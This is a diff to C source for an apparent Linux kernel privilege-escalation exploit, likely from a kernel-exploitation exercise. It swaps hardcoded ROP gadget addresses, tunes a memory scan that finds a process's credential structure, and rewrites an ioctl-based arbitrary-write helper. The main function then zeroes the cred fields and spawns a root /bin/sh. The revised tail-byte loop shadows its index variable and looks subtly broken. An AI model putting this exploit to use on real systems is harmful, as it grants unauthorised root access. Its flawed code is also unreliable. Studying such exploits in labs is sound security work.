@@ -17,8 +17,8 @@ uintptr_t offset;
 
 uintptr_t g_buf;
 
-uintptr_t mov_prdx_rcx	= 0xffffffff811b7dd6;
-uintptr_t mov_rax_prdx	= 0xffffffff813a5f29;
+uintptr_t mov_prdx_ecx	= 0xffffffff814b27c2;
+uintptr_t mov_eax_prdx	= 0xffffffff81440428;
 
 static void leak_offset_and_g_buf(void)
 {
@@ -54,7 +54,7 @@ static uint32_t aar32(uintptr_t ptr)
 static uintptr_t search_cred(void)
 {
 	uint8_t name[16] = "$this_is_evil_$";
-	uintptr_t ptr = g_buf - 0x1000000;
+	uintptr_t ptr = g_buf - 0x500000;
 	uint8_t data[0x420];
 	uintptr_t cred;
 	uint32_t tmp;
@@ -65,7 +65,7 @@ static uintptr_t search_cred(void)
 	}
 
 	read(fd, data, 0x420);
-	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_rax_prdx);
+	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_eax_prdx);
 	*(uintptr_t *)&data[0x418] = g_buf;
 
 	write(fd, data, 0x420);
@@ -102,26 +102,32 @@ static uintptr_t search_cred(void)
 	}
 
 	cred = (uintptr_t)aar32(ptr - 4) << 32;
-	cred += aar32(ptr - 8);
+	cred |= aar32(ptr - 8);
 
 	return cred;
 }
 
-static void aaw(uintptr_t ptr, uint8_t *buf, size_t count)
+static void aaw(uintptr_t ptr, uint8_t *buf, size_t len)
 {
 	uint8_t data[0x420];
-	size_t left = count;
+	size_t left = len;
 	uint32_t tmp;
 
 	read(fd, data, 0x420);
-	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_prdx_rcx);
+	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_prdx_ecx);
 	*(uintptr_t *)&data[0x418] = g_buf;
 
 	write(fd, data, 0x420);
 
-	for (int i = 0; i < count; i += 4, left -= 4) {
-		tmp = 0;
-		memcpy(&tmp, buf + i, left >= 4 ? 4 : left);
+	for (int i = 0; i < len; i += 4, left -= 4) {
+		if (left >= 4) {
+			tmp = *(uint32_t *)(buf + i);
+		} else {
+			tmp = 0;
+			for (int i = 0; i < left; ++i)
+				tmp |= (uint32_t)(*(uint8_t *)(buf + i))
+				       << (3 - i) * 8;
+		}
 
 		if (target) {
 			ioctl(target, tmp, ptr + i);
@@ -173,8 +179,16 @@ int main(void)
 		printf("[+] cred %p\n", cred);
 	}
 
-	for (int i = 0; i < 8; ++i)
-		aaw(cred + (i + 1) * 4, "\x00\x00\x00\x00", 4);
+	aaw(cred + 4,
+	    "\x00\x00\x00\x00"
+	    "\x00\x00\x00\x00"
+	    "\x00\x00\x00\x00"
+	    "\x00\x00\x00\x00"
+	    "\x00\x00\x00\x00"
+	    "\x00\x00\x00\x00"
+	    "\x00\x00\x00\x00"
+	    "\x00\x00\x00\x00",
+	    32);
 
 	printf("[+] get r00t!\n");
 	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
